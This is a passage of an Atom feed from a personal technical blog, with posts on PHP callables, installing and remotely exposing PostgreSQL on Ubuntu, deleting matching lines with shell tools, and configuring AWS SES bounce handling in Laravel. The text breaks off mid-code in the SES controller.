<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Js&#39; Technical Blog</title>
  <icon>http://blog.jsl.im/files/img/logo.png</icon>
  <subtitle>This is my technical blog about programming, server setup &amp; configuration, technical learning experience.</subtitle>
  <link href="http://jslim.net/atom.xml" rel="self"/>
  
  <link href="http://jslim.net/"/>
  <updated>2022-05-09T09:30:48.617Z</updated>
  <id>http://jslim.net/</id>
  
  <author>
    <name>Js Lim</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP7 Callable Examples</title>
    <link href="http://jslim.net/blog/2022/01/12/PHP7-Callable-Examples/"/>
    <id>http://jslim.net/blog/2022/01/12/PHP7-Callable-Examples/</id>
    <published>2022-01-12T07:08:04.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="A-callable-as-class-property"><a href="#A-callable-as-class-property" class="headerlink" title="A callable as class property"></a>A callable as class property</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Processor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$postHook</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">callable</span> <span class="variable">$postHook</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;postHook = <span class="variable">$postHook</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// some statements here</span></span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;postHook)(<span class="variable">$param1</span>, <span class="variable">$param2</span>, <span class="variable">$param3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$processor</span> = <span class="keyword">new</span> <span class="title class_">Processor</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">postProcess</span>());</span><br><span class="line">        <span class="variable">$processor</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">postProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// some statements</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://stackoverflow.com/questions/4535330/calling-closure-assigned-to-object-property-directly/4535383#4535383">Calling closure assigned to object property directly</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h3 id=&quot;A-callable-as-class-property&quot;&gt;&lt;a href=&quot;#A-callable-as-class-property&quot; class=&quot;headerlink&quot; title=&quot;A callable as class property&quot;&gt;&lt;/a&gt;A</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Setup postgres in Ubuntu server</title>
    <link href="http://jslim.net/blog/2021/07/04/Setup-postgres-in-Ubuntu-server/"/>
    <id>http://jslim.net/blog/2021/07/04/Setup-postgres-in-Ubuntu-server/</id>
    <published>2021-07-04T08:31:23.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>To install PostgreSQL in Ubuntu <em>(tested in 20.04)</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;deb http://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main&quot;</span> &gt; <span class="regexp">/etc/</span>apt<span class="regexp">/sources.list.d/</span>pgdg.list</span><br><span class="line">wget --quiet -O - https:<span class="regexp">//</span>www.postgresql.org<span class="regexp">/media/</span>keys/ACCC4CF8.asc | apt-key add -</span><br><span class="line">apt update</span><br><span class="line">apt -y install postgresql</span><br></pre></td></tr></table></figure><p>The version installed here is v13</p><h2 id="First-time-setup"><a href="#First-time-setup" class="headerlink" title="First time setup"></a>First time setup</h2><p>For the first time, we need to create a new user &amp; a new database</p><p>Switch to postgres user</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@host</span><span class="symbol">:/root</span><span class="comment"># su postgres</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect to postgres server</span></span><br><span class="line">postgres<span class="variable">@host</span><span class="symbol">:/root</span><span class="variable">$ </span>psql</span><br></pre></td></tr></table></figure><p>Then</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">postgres=# <span class="keyword">CREATE</span> <span class="keyword">ROLE</span> my_user <span class="keyword">LOGIN</span> <span class="keyword">PASSWORD</span> <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ROLE</span></span><br><span class="line">postgres=# <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> my_database;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span></span><br><span class="line">postgres=# <span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> <span class="keyword">DATABASE</span> my_database <span class="keyword">TO</span> my_user;</span><br><span class="line"><span class="keyword">GRANT</span></span><br><span class="line">postgres=# <span class="keyword">GRANT</span> <span class="keyword">USAGE</span> <span class="keyword">ON</span> <span class="keyword">SCHEMA</span> <span class="built_in">public</span> <span class="keyword">TO</span> my_user;</span><br><span class="line"><span class="keyword">GRANT</span></span><br></pre></td></tr></table></figure><p><strong>Import data if necessary</strong></p><p>Then run</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \c my_database</span><br><span class="line">You are now connected <span class="keyword">to</span> <span class="keyword">database</span> &quot;my_database&quot; <span class="keyword">as</span> <span class="keyword">user</span> &quot;postgres&quot;.</span><br><span class="line">my_database=# <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> <span class="keyword">TABLES</span> <span class="keyword">IN</span> <span class="keyword">SCHEMA</span> <span class="built_in">public</span> <span class="keyword">TO</span> my_user;</span><br><span class="line"><span class="keyword">GRANT</span></span><br><span class="line">my_database=# <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> <span class="keyword">SEQUENCES</span> <span class="keyword">IN</span> <span class="keyword">SCHEMA</span> <span class="built_in">public</span> <span class="keyword">TO</span> my_user;</span><br><span class="line"><span class="keyword">GRANT</span></span><br></pre></td></tr></table></figure><p>Then back to root user. To enable public remote access</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postgres@host:/root$ <span class="keyword">exit</span></span><br><span class="line">root@host:<span class="regexp">/root# vim /</span>etc<span class="regexp">/postgresql/</span><span class="number">13</span><span class="regexp">/main/</span>postgresql.conf</span><br></pre></td></tr></table></figure><p>Change <strong>listen_addresses</strong> value to <code>*</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listen_addresses</span> = <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure><p>Then edit <strong>pg_hba.conf</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@host:/root# vim /etc/postgresql/<span class="number">13</span>/main/pg_hba.conf</span><br></pre></td></tr></table></figure><p>Change the line </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">host</span>    <span class="literal">all</span>             <span class="literal">all</span>             <span class="number">127.0.0.1</span>/<span class="number">32</span>            md5</span><br></pre></td></tr></table></figure><p>to</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">host</span>    <span class="literal">all</span>             <span class="literal">all</span>             <span class="number">0.0.0.0</span>/<span class="number">0</span>              md5</span><br></pre></td></tr></table></figure><p>Then restart server</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@host</span><span class="symbol">:/root</span><span class="comment"># service postgresql restart</span></span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://www.postgresql.org/download/linux/ubuntu/">Linux downloads (Ubuntu)</a></li><li><a href="https://chartio.com/learn/postgresql/create-a-user-with-psql/">How to create a user with PSQL</a></li><li><a href="https://www.guru99.com/postgresql-create-database.html">PostgreSQL/Postgres Create Database</a></li><li><a href="https://www.bigbinary.com/blog/configure-postgresql-to-allow-remote-connection">Configure PostgreSQL to allow remote connection</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;To install PostgreSQL in Ubuntu &lt;em&gt;(tested in 20.04)&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="ubuntu" scheme="http://jslim.net/tags/ubuntu/"/>
    
    <category term="postgres" scheme="http://jslim.net/tags/postgres/"/>
    
  </entry>
  
  <entry>
    <title>Shell script - remove lines contain some words</title>
    <link href="http://jslim.net/blog/2021/06/03/Shell-script-remove-lines-contain-some-words/"/>
    <id>http://jslim.net/blog/2021/06/03/Shell-script-remove-lines-contain-some-words/</id>
    <published>2021-06-03T11:29:55.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>A sample file <strong>demo.txt</strong> contains the following content</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>Linux Operating <span class="keyword">System</span></span><br><span class="line"><span class="symbol">2 </span>Unix Operating <span class="keyword">System</span></span><br><span class="line"><span class="symbol">3 </span>RHEL</span><br><span class="line"><span class="symbol">4 </span>Red Hat</span><br><span class="line"><span class="symbol">5 </span>Fedora</span><br><span class="line"><span class="symbol">6 </span>Arch Linux</span><br><span class="line"><span class="symbol">7 </span>CentOS</span><br><span class="line"><span class="symbol">8 </span>Debian</span><br><span class="line"><span class="symbol">9 </span>Ubuntu</span><br><span class="line"><span class="symbol">10 </span>openSUSE</span><br></pre></td></tr></table></figure><h2 id="How-do-we-delete-lines-that-contain-operating"><a href="#How-do-we-delete-lines-that-contain-operating" class="headerlink" title="How do we delete lines that contain operating?"></a>How do we delete lines that contain <code>operating</code>?</h2><h4 id="1-Find-the-line-number"><a href="#1-Find-the-line-number" class="headerlink" title="1. Find the line number"></a>1. Find the line number</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> grep -in <span class="string">&quot;operating&quot;</span> demo.txt</span><br><span class="line"><span class="number">1</span>:<span class="number">1</span> Linux Operating <span class="keyword">System</span></span><br><span class="line"><span class="number">2</span>:<span class="number">2</span> Unix Operating <span class="keyword">System</span></span><br></pre></td></tr></table></figure><h4 id="2-Then-use-awk-to-get-the-first-chunk"><a href="#2-Then-use-awk-to-get-the-first-chunk" class="headerlink" title="2. Then use awk to get the first chunk"></a>2. Then use <code>awk</code> to get the first chunk</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> grep <span class="operator">-in</span> <span class="string">&quot;operating&quot;</span> demo.txt | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">1</span>:<span class="number">1</span></span><br><span class="line"><span class="number">2</span>:<span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="3-Get-only-the-line-number"><a href="#3-Get-only-the-line-number" class="headerlink" title="3. Get only the line number"></a>3. Get only the line number</h4><p>This will split the string by delimiter <code>:</code>, and get the first chunk</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> grep <span class="operator">-in</span> <span class="string">&quot;operating&quot;</span> demo.txt | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | cut <span class="literal">-d</span> <span class="string">&#x27;:&#x27;</span> <span class="operator">-f</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="4-Delete-by-using-sed-command"><a href="#4-Delete-by-using-sed-command" class="headerlink" title="4. Delete by using sed command"></a>4. Delete by using <code>sed</code> command</h4><p>The <code>sed</code> command delete by line number like this</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sed <span class="string">&#x27;23d;45d;102d&#x27;</span> filename.ext</span><br></pre></td></tr></table></figure><p>Before that we already can get line number, so now we have to join it into a single line</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -<span class="keyword">in</span> <span class="string">&quot;operating&quot;</span> demo.txt | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="built_in">echo</span> <span class="string">&#x27;&#123;&#125;d&#x27;</span> | <span class="built_in">paste</span> -d<span class="string">&#x27;;&#x27;</span> -s</span></span><br><span class="line">1d;2d</span><br></pre></td></tr></table></figure><ul><li>with <code>xargs</code>, it append a character “d”</li><li>with <code>paste</code>, 2 lines joined into a single line</li></ul><p>At the end, we can</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -<span class="keyword">in</span> <span class="string">&quot;operating&quot;</span> demo.txt | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="built_in">echo</span> <span class="string">&#x27;&#123;&#125;d&#x27;</span> | <span class="built_in">paste</span> -d<span class="string">&#x27;;&#x27;</span> -s | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> sed <span class="string">&#x27;&#123;&#125;&#x27;</span> demo.txt</span></span><br><span class="line">3 RHEL</span><br><span class="line">4 Red Hat</span><br><span class="line">5 Fedora</span><br><span class="line">6 Arch Linux</span><br><span class="line">7 CentOS</span><br><span class="line">8 Debian</span><br><span class="line">9 Ubuntu</span><br><span class="line">10 openSUSE</span><br></pre></td></tr></table></figure><p>It will output to stdout, if you want to replace the file, use <code>-i</code> option</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -<span class="keyword">in</span> <span class="string">&quot;operating&quot;</span> demo.txt | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="built_in">echo</span> <span class="string">&#x27;&#123;&#125;d&#x27;</span> | <span class="built_in">paste</span> -d<span class="string">&#x27;;&#x27;</span> -s | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> sed -i <span class="string">&#x27;&#123;&#125;&#x27;</span> demo.txt</span></span><br></pre></td></tr></table></figure><h3 id="Make-it-into-a-shell-script-function"><a href="#Make-it-into-a-shell-script-function" class="headerlink" title="Make it into a shell script function"></a>Make it into a shell script function</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">delete_lines_contain_text</span></span> () &#123;</span><br><span class="line">    txt=<span class="variable">$1</span></span><br><span class="line">    file=<span class="variable">$2</span></span><br><span class="line">    grep -<span class="keyword">in</span> <span class="variable">$txt</span> <span class="variable">$file</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="built_in">echo</span> <span class="string">&#x27;&#123;&#125;d&#x27;</span> | <span class="built_in">paste</span> -d<span class="string">&#x27;;&#x27;</span> -s | xargs -I<span class="string">&#x27;&#123;&#125;&#x27;</span> sed -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="variable">$file</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># usage</span></span><br><span class="line">delete_lines_contain_text <span class="string">&quot;operating&quot;</span> demo.txt</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://www.2daygeek.com/linux-remove-delete-lines-in-file-sed-command/">How to delete lines from a file using sed command</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;A sample file &lt;strong&gt;demo.txt&lt;/strong&gt; contains the following content&lt;/p&gt;
&lt;figure class=&quot;highlight basic&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="shell" scheme="http://jslim.net/tags/shell/"/>
    
    <category term="bash" scheme="http://jslim.net/tags/bash/"/>
    
  </entry>
  
  <entry>
    <title>Enable AWS SES in Laravel web app</title>
    <link href="http://jslim.net/blog/2021/05/09/Enable-AWS-SES-in-Laravel-web-app/"/>
    <id>http://jslim.net/blog/2021/05/09/Enable-AWS-SES-in-Laravel-web-app/</id>
    <published>2021-05-09T10:21:10.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I believe most of AWS users will use Amazon Simple Email Service <strong>(SES)</strong><br>for system email sending.</p><p>Before you can use in production, by default it’s in <em>sandbox</em> mode, which<br>you are required to pre-configure a few email addresses to receive email.</p><p>You’re required to describe your use case, what you will use for, how<br>you will handle bounce back email, etc. in details.</p><p>E.g. You will be rejected if not provide enough information</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/request-ses-production.png" alt="Failed to apply SES production"></p><p>Let’s get started</p><hr><h2 id="1-Configure-in-AWS-console"><a href="#1-Configure-in-AWS-console" class="headerlink" title="1. Configure in AWS console"></a>1. Configure in AWS console</h2><p>Make sure you verify your domain.</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/verify-domain.png" alt="SES verify domain"></p><p>In order to verify, you need to add a TXT record to your DNS management.</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/ses-domain-txt-record.png" alt="SES domain TXT record"></p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/dns-records.png" alt="Namecheap DNS management"></p><p>After domain, then add an email address <em>(the from email)</em></p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/add-email-address.png" alt="sent from email"></p><p>Once added, make sure verify <strong>DKIM</strong> &amp; <strong>MAIL FROM Domain</strong>, just add a few records to DNS management</p><p>When using SES, must have this mechanism to handle bounced email.<br>Let say a spammer trick your system to keep blasting email to addresses that doesn’t exist,<br>SES may block the service.</p><h3 id="1-1-Create-SNS-topic"><a href="#1-1-Create-SNS-topic" class="headerlink" title="1.1. Create SNS topic"></a>1.1. Create SNS topic</h3><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/create-sns-topic.png" alt="Create SNS topic"></p><p>It’s something like a <em>event listener</em>, when some events happen, the listener will perform certain actions.</p><p>The <em>action</em> here means <em>subscription</em>, let’s create one</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/create-subscription.png" alt="Create SNS subscription"></p><p>And here, I’m using webhook with HTTPS endpoint</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/specify-endpoint.png" alt="Configure SNS subscription"></p><p>Make sure the endpoint is available, SNS will ping it for confirmation</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/sns-subscription-created.png" alt="SNS subscription confirmation"></p><h3 id="1-2-Configure-SES-to-link-with-SNS"><a href="#1-2-Configure-SES-to-link-with-SNS" class="headerlink" title="1.2. Configure SES to link with SNS"></a>1.2. Configure SES to link with SNS</h3><p>Go to <strong>Notifications</strong>, and edit</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/configure-ses-with-sns.png" alt="Configure SES to use SNS"></p><p>Set the <em>topic</em> to what you created just now</p><p><img src="/images/posts/2021-05-09-Enable-AWS-SES-in-Laravel-web-app/set-topic-to-ses.png" alt="Configure SES to use SNS topic"></p><h2 id="2-Email-Response-Handler"><a href="#2-Email-Response-Handler" class="headerlink" title="2. Email Response Handler"></a>2. Email Response Handler</h2><p>Remember, we’ve specified an endpoint to the topic subscription?</p><p>Let’s create the endpoint in <strong>routes/web.php</strong>. This will only be used by AWS</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;webhook/aws/ses-notification&#x27;</span>, [<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;SesController@sesNotification&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>Also, we need a table to keep all bounced emails</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan <span class="built_in">make</span>:migration create_bounced_emails_table</span><br></pre></td></tr></table></figure><p>with this schema</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Schema</span>::<span class="title function_ invoke__">create</span>(<span class="string">&#x27;bounced_emails&#x27;</span>, function (Blueprint <span class="variable">$table</span>) &#123;</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="keyword">string</span>(<span class="string">&#x27;email&#x27;</span>)-&gt;<span class="title function_ invoke__">primary</span>();</span><br><span class="line">    <span class="variable">$table</span>-&gt;<span class="title function_ invoke__">timestamps</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In <strong>SesController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">BouncedEmail</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Aws</span>\<span class="title">Sns</span>\<span class="title">Message</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Aws</span>\<span class="title">Sns</span>\<span class="title">MessageValidator</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">NOTIFICATION_DELIVERY</span>  = <span class="string">&#x27;Delivery&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">NOTIFICATION_BOUNCE</span>    = <span class="string">&#x27;Bounce&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">NOTIFICATION_COMPLAINT</span> = <span class="string">&#x27;Complaint&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sesNotification</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">method</span>() !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>(<span class="string">&#x27;405 (Accept POST Only)&#x27;</span>, <span 